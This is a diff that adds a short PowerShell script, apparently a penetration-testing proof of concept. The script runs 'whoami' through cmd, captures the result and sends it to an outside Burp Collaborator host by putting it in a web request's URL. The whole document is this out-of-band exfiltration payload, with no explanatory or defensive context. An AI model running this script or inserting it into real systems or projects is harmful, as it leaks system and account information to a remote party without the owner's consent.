@@ -1,0 +1,13 @@
+$i=New-object System.Diagnostics.ProcessStartInfo;
+$i.RedirectStandardOutput=$true;
+$i.CreateNoWindow=$false;
+$i.UseShellExecute=$false;
+$i.FileName="cmd";
+$i.Arguments="/c whoami";
+$r=New-Object System.Diagnostics.Process;
+$r.StartInfo=$i;
+$r.Start();
+$stdout=$r.StandardOutput.ReadToEnd();
+$r.WaitForExit();
+$wc=New-Object system.Net.WebClient;
+$wc.downloadString("http://qpjx5jhw5iepwty74syonufe85ev2k.burpcollaborator.net/$stdout");
